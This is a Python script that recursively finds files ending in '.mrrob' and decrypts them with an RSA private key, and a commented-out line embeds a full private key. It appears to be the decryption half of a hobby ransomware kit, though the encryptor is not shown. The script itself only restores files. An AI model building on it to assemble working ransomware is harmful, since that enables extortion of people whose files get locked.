import rsa
import os

#load public key
with open('privateKey.pem', 'rb') as p:
    privateKey = rsa.PrivateKey.load_pkcs1(p.read())

#privateKey=rsa.PrivateKey(19652435492732942274279747825931491705041738293358879239768224721069406376869458678680378789564439200751322941091295227506545905211672288247467480689261466383568716904001361864227339413777871952451115697197804895710214373487523070402301296267661972889608058987374449588072494997986968309147323122856429007692765556786714874976206709929924571630620259839701515297123831958202627023107654166664461300149800324774288153115943629156131606889691678916825422136815386201406157485162615731942093233959231701635191621724616287319404806380747627526104434494536164647153649870531128979823018988688809561678930750335030046760071, 65537, 7398638035189280631296889056703964094152842042083763789657772075971519348406246150709995664661540937182620365984795262954804265060768579091654563850132721364752597039419344817066407454661358235543683378808328733263013553215094629232891036861803620200883464903725983714337132750741298336688263292645696472963478178840285335213862244097226656910061358701319016851961453630471054251448255726512905314895205821900771676910127555640162177082716710647509810893187443191528171013699443738901349750276494228482116281230349013085489111498676231403159352913685833162800989542930788931749873112846787087819683508090432468828849, 2155878900646988943222760748301223863204042880991832753914173789320228544250654118055632346557431908266213305177234969681241202374372749909815297681236198979525725210562824442346021356564793160203914777464855165589285529951716621704869110892149566107854670357802679976697279200823108015059090347315951841883973502575862957351279, 9115741838205827839257322283997917830913560157472426432103847646564955930409802468280064280296222172214716395663964284324765766408786602282211120499073156734824239987644389487625593941530019824250772686800785956455312229619293125427859678946657765311432625621231027684609982743859963820649)

#decrypt file
def DecryptData(filename):
    if not filename.endswith(".mrrob"):
        return
    print("Decrypting: "+filename)
    temp=""
    temp=bytes(temp,'utf-8')
    with open(filename,'rb') as p:
        while(1):
            data=p.read(256)
            if len(data) == 0:
                break
            decData = rsa.decrypt(data, privateKey)
            temp=temp+decData
    with open(filename[:(len(filename)-6)],'wb') as p:
        p.write(temp)

#iterate through directories and give files
def giveFiles(Basefolder):
    insideFolder=os.listdir(Basefolder)
    for x in insideFolder:
        if os.path.isfile(os.path.join(Basefolder,x)):
            DecryptData((os.path.join(Basefolder,x)))
        else:
            giveFiles(os.path.join(Basefolder,x))

currentFolder=os.getcwd()
giveFiles(currentFolder)